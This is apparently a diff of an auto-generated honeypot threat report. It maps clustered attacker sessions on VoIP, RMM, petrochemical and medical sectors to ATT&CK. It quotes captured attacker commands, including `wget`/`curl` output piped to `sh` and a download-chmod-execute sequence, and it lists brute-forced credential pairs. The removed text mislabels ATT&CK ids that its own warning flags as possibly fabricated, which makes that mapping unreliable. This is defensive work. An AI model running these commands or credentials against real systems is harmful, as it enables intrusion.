@@ -4,81 +4,121 @@ _Window: last 24h. Baseline: 30d preceding the window. Sessions reconstructed an
 
 ## Cluster Analysis
 
-- **Cluster f51f8c5f99bd** (PBX & Petrochemicals - sessions: 5, unique_ips: 5): This cluster shows attackers attempting to establish a reverse telnet connection using either `wget` or `curl` to download a payload from a URL. The commands involve modifying the shell environment and piping execution output into `telnet`.
-    - **ATT&CK T1204.001**: Command and Scripting Interpreter: Unix Shell (commands executed).
-        *Rationale:* Direct command execution performed. Confidence is high here due to observed behavior.
-    - **ATT&CK T1566.001**: Phishing: Spearphishing Link (download payload from a URL)
-        *Rationale:* The use of `wget` and `curl` points to downloading suspicious content.
-- **Cluster 7ab552f01de9** (PBX - sessions: 5, unique_ips: 2): This cluster focused on gathering system information via the `uname -s -v -n -r -m` command, indicating an intention to map vulnerable versions of systems and gather intelligence about the environment.
-    - **ATT&CK T1082**: System Information Discovery (collecting OS version etc.). 
-        *Rationale:* Direct system enumeration by using `uname`. Confidence is high here due to observed behavior.
-- **Cluster 6fa4c8ac58e7** (PBX & RMM - sessions: 4, unique_ips: 4): It appears that the attackers were probing for information on systems through a series of commands aimed at understanding the environment and network topology. 
-    - **ATT&CK T1059.004**: Command and Scripting Interpreter (Unix Shell)
-        *Rationale:* General command execution noted. Confidence is moderate due to multiple commands including enumeration steps.
+### Cluster: `28ba533b0f3c`
+- **Operator Goal**: Gather system information, likely to assess the target's environment.
+- **Tooling/Malware Family**: None identified.
+- **MITRE ATT&CK**:
+  - T1082 (System Information Discovery): The command `uname -a` is used to gather basic system information. Confidence: High.
+
+### Cluster: `45245f464066`
+- **Operator Goal**: Likely attempting to execute some form of obfuscated or encoded commands.
+- **Tooling/Malware Family**: None identified.
+- **MITRE ATT&CK**:
+  - No fitting technique from the provided menu.
+
+### Cluster: `b55d713e4cae`
+- **Operator Goal**: Test shell access with a novel command, possibly to evade detection or test system configuration.
+- **Tooling/Malware Family**: None identified.
+- **MITRE ATT&CK**:
+  - T1059.004 (Command and Scripting Interpreter: Unix Shell): Use of `echo xsec` indicates shell access testing. Confidence: High.
+
+### Cluster: `f2b21a224482`
+- **Operator Goal**: Gather detailed system information including architecture, CPU details.
+- **Tooling/Malware Family**: None identified.
+- **MITRE ATT&CK**:
+  - T1082 (System Information Discovery): Commands like `uname -m` and `cat /proc/cpuinfo` are used to gather system and hardware details. Confidence: High.
+
+### Cluster: `f51f8c5f99bd`
+- **Operator Goal**: Gather user information, possibly preparing for lateral movement or privilege escalation.
+- **Tooling/Malware Family**: None identified.
+- **MITRE ATT&CK**:
+  - T1033 (System Owner/User Discovery): The command `id` is used to gather current user details. Confidence: High.
+
+### Cluster: `98cbf1e25e64`
+- **Operator Goal**: Gather detailed system information, possibly for compatibility checks.
+- **Tooling/Malware Family**: None identified.
+- **MITRE ATT&CK**:
+  - T1082 (System Information Discovery): Commands like `uname` and `/proc/version` are used to gather system details. Confidence: High.
+
+### Cluster: `4ca4f61bcd77`
+- **Operator Goal**: Attempting to download a payload, possibly for further exploitation or persistence.
+- **Tooling/Malware Family**: None identified.
+- **MITRE ATT&CK**:
+  - T1105 (Ingress Tool Transfer): The command `wget <URL> -O .x` indicates an attempt to fetch and execute a payload. Confidence: High.
 
 ## What's Notable
 
-- The presence of several novel clusters, indicating that some attacking methodologies might be newly introduced (e.g., the novel `echo xsec` cluster or other payload handling instructions).
-- There are several fully‐novel command sequences that have not been seen in the baseline analysis – this potentially indicates a move to more targeted and less common scripts among attackers.
-- The usage of sector-exclusive clusters means that the attacks appear more focused on specific sectors (PBX, RMM) than random scanning activity – these are more indicative of targeted campaigns as opposed to broad credential stuffing exercises.
-- An increase in use of multiple payload download techniques via commonly known utilities like `wget` or `curl`, pointing toward efforts in establishing reverse shells and command & control channels post-exploitation.
+1. **Cluster `b55d713e4cae`:**
+   - This cluster is notable for its fully novel command pattern (`echo xsec`). The novelty suggests the attacker may be testing new methods or evading detection.
+2. **Sector-Targeted Behaviour:**
+   - Clusters targeting specific sectors like VoIP/telephony, remote management (RMM), and petrochemical industries indicate sector-specific campaigns.
+3. **Successful Credential Pairs:**
+   - Credentials such as `root/123456`, `admin/admin`, and `hikvision/hikvision` were successfully used across multiple clusters, indicating common weak credentials being exploited.
+4. **Payload Downloads:**
+   - Cluster `4ca4f61bcd77` shows a novel command for downloading and executing payloads (`wget <URL> -O .x; chmod <N> .x; ./.x telnet`). This is concerning as it indicates the potential for further exploitation.
 
 ## Recommended Actions
 
-**Detection:** 
-  - Crafting YARA rules to detect unusual payload structures used in session data (especially the base64 encoded commands).
-  - Setting up Suricata detection for suspicious URL payloads using network-based signatures related to the attacker C2 infrastructures.
-  - Developing Sigma rules that flag sequences such as `wget/curl` followed by reverse shell executions or script installations which are not normally executed in authorized administrative contexts.
+### Detection Ideas
+- **Sigma/YARA/Suricata Concepts:**
+  - Detect novel command patterns like `echo xsec` and `wget <URL> -O .x`.
+  - Monitor for unusual sequences of commands, such as multiple system information gathering commands.
+  - Look for obfuscated or encoded strings in shell sessions.
 
-**IOCs Worth Hunting:**
-  - URLs mentioned for pulling down payloads with suspicious source IPs (e.g., associated with command and control traffic).
-  - The specific novel commands, such as the repeated "echo xsec" or payload download sequences that differ from commonly seen attacks in the baseline analysis.
+### IOCs Worth Hunting
+- **IP Addresses:**
+  - Focus on IPs from clusters with novel command patterns (`4ca4f61bcd77`, `b55d713e4cae`).
+- **Payload Hashes:**
+  - Hunt for files with hashes like `7fd2bd41e693e49cd09260d85864709cc8066f9681b3c2014d9241f128694915` and `df78602fd918d9e393d5d8aaf01fa76e01b615578cdbf513589319932fe3099b`.
 
-**No Action Needed Commodity Noise:** 
-  - Standard brute force attempts targeting known vulnerable credentials or systems are typical attack noise patterns and can be filtered out accordingly based on frequency and commonality against the honeypot activity history.
-  
-This analysis is crucial to understanding evolving attacking methods and ensuring more targeted defensive measures against newer, potentially customized commands that may have just started showing up in the attacker's arsenal against our monitored networks.
-
-> **Validation warning:** ATT&CK ids cited but not in the curated menu, possibly fabricated: `T1204.001`, `T1566.001`.
+### No Action Needed
+- **Commodity Noise:**
+  - Clusters with common commands like `uname` and `id`, which are often used in reconnaissance but do not indicate specific threats.
 
 ## Totals
 | Metric | Count |
 |---|---|
-| Sessions with commands | 188 |
-| Successful logins | 277 |
-| Commands | 1,758 |
-| Payload downloads | 65 |
-| Clusters | 114 |
-| Clusters with novel commands | 105 |
+| Sessions with commands | 207 |
+| Successful logins | 283 |
+| Commands | 1,516 |
+| Payload downloads | 56 |
+| Clusters | 99 |
+| Clusters with novel commands | 90 |
 | Fully novel clusters | 4 |
-| Sector exclusive clusters | 107 |
+| Sector exclusive clusters | 92 |
 
 ## By Sector
 | Sector | Interactive sessions | Unique IPs |
 |---|---|---|
-| VoIP / telephony | 107 | 77 |
-| remote management (RMM) | 51 | 21 |
+| VoIP / telephony | 92 | 67 |
+| remote management (RMM) | 63 | 37 |
 | petrochemical | 29 | 23 |
-| medical technology | 1 | 1 |
+| medical technology | 23 | 23 |
 
 ## Command Clusters
 | Cluster | Sessions | IPs | Sectors | Exclusive | Novel | Cmds | Payloads |
 |---|---|---|---|---|---|---|---|
+| `28ba533b0f3c` | 37 | 37 | VoIP / telephony, medical technology, remote management (RMM) | no | no | 1 | 0 |
 | `45245f464066` | 17 | 2 | remote management (RMM) | yes | no | 2 | 0 |
 | `b55d713e4cae` | 9 | 3 | VoIP / telephony | yes | **full** | 1 | 0 |
-| `906055e56391` | 6 | 5 | VoIP / telephony, petrochemical | no | no | 1 | 0 |
-| `f51f8c5f99bd` | 5 | 5 | VoIP / telephony, petrochemical | no | 9% | 11 | 0 |
+| `906055e56391` | 6 | 6 | petrochemical, remote management (RMM) | no | no | 1 | 0 |
+| `f2b21a224482` | 6 | 1 | VoIP / telephony, petrochemical, remote management (RMM) | no | no | 3 | 0 |
+| `6fa4c8ac58e7` | 5 | 5 | VoIP / telephony, medical technology, remote management (RMM) | no | no | 1 | 0 |
 | `c213a35b3477` | 5 | 4 | VoIP / telephony, petrochemical, remote management (RMM) | no | no | 2 | 0 |
 | `7ab552f01de9` | 5 | 2 | VoIP / telephony | yes | no | 1 | 0 |
-| `6fa4c8ac58e7` | 4 | 4 | VoIP / telephony, remote management (RMM) | no | no | 1 | 0 |
+| `f51f8c5f99bd` | 4 | 4 | VoIP / telephony, petrochemical | no | 9% | 11 | 0 |
 | `98cbf1e25e64` | 4 | 1 | VoIP / telephony | yes | 11% | 9 | 0 |
-| `89233a95a033` | 4 | 1 | remote management (RMM) | yes | 11% | 9 | 0 |
-| `da43a2ad017a` | 4 | 1 | VoIP / telephony, remote management (RMM) | no | 11% | 9 | 0 |
 | `8fdcf6478824` | 4 | 1 | remote management (RMM) | yes | 11% | 9 | 0 |
+| `1db2425da44c` | 3 | 3 | VoIP / telephony | yes | 11% | 9 | 0 |
 | `7a620def14a6` | 3 | 2 | petrochemical | yes | 11% | 9 | 0 |
-| `f2b21a224482` | 3 | 1 | VoIP / telephony, petrochemical, remote management (RMM) | no | no | 3 | 0 |
+| `4ca4f61bcd77` | 3 | 1 | VoIP / telephony, petrochemical, remote management (RMM) | no | **full** | 1 | 2 |
 | `9750b2b45721` | 2 | 2 | VoIP / telephony | yes | 11% | 9 | 0 |
-| `1db2425da44c` | 2 | 2 | VoIP / telephony | yes | 11% | 9 | 0 |
+
+### Cluster `28ba533b0f3c` — 37 session(s), 37 IP(s)
+```
+uname -a
+```
+Credentials used: `adm/louisianamedical123#`, `admin/Globalsolutions!2026`, `admin/Globalsolutions@2026`, `admin/louisianamedical@123`, `apache/Louisianamedical2026`, `apache/globalsolutions123@`
 
 ### Cluster `45245f464066` — 17 session(s), 2 IP(s) — **remote management (RMM) only**
 ```
@@ -93,27 +133,25 @@ echo xsec
 ```
 Credentials used: `root/1020`, `root/123456`, `root/1qaz!QAZ`, `root/1qazXSW@`, `root/Aa123456`, `root/password`
 
-### Cluster `906055e56391` — 6 session(s), 5 IP(s)
+### Cluster `906055e56391` — 6 session(s), 6 IP(s)
 ```
 PING
 ```
 Credentials used: `*1/$4`
 
-### Cluster `f51f8c5f99bd` — 5 session(s), 5 IP(s) — 1 novel command(s)
+### Cluster `f2b21a224482` — 6 session(s), 1 IP(s)
 ```
-id
-cat /etc/passwd
-echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"
-enable
-system
-shell
-sh
-bash
-(wget --no-check-certificate -qO- <URL> || curl -sk <URL> | sh -s telnet; echo -e "\x72\x65\x64\x74\x61\x69\x6C\x5F\x62\x6F\x74\x5F\x74\x65\x6C\x6E\x65\x74\x5F\
-wget --no-check-certificate -qO- <URL>
-curl -sk <URL>
+echo SHELL_TEST
+uname -m
+cat /proc/cpuinfo
 ```
-Credentials used: `admin/admin`, `orangepi/orangepi`, `root/P`, `root/password`
+Credentials used: `hikvision/hikvision`, `root/123456`, `root/root`, `root/vizxv`, `root/xc3511`
+
+### Cluster `6fa4c8ac58e7` — 5 session(s), 5 IP(s)
+```
+uname -s -m
+```
+Credentials used: `root/123456`, `root/1qaz!QAZ`, `root/h3c.com!`, `root/root123456`
 
 ### Cluster `c213a35b3477` — 5 session(s), 4 IP(s)
 ```
@@ -127,23 +165,3 @@ Credentials used: `admin/admin`, `root/123456`, `root/root`, `user/user`
 uname -s -v -n -r -m
 ```
 Credentials used: `rdpuser/123456`, `root/123456`, `user/1234`, `user/user`, `username/password`
-
-### Cluster `6fa4c8ac58e7` — 4 session(s), 4 IP(s)
-```
-uname -s -m
-```
-Credentials used: `root/1qaz!QAZ`, `root/h3c.com!`, `root/root123456`
-
-### Cluster `98cbf1e25e64` — 4 session(s), 1 IP(s) — 1 novel command(s) — **VoIP / telephony only**
-```
-export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /
-uname -s -v -n -m 2 > /dev/null
-/bin/uname -s -v -n -m 2 > /dev/null
-/usr/bin/uname -s -v -n -m 2 > /dev/null
-busybox uname -s -v -n -m 2 > /dev/null
-( [ -f /proc/version ]
-[ -f /proc/version ]
-head -1 /proc/version | cut -d -f1
-[ -f /etc/os-release ]
-```
-Credentials used: `admin/admin`, `guest/123123`, `root/12345`, `root/password`
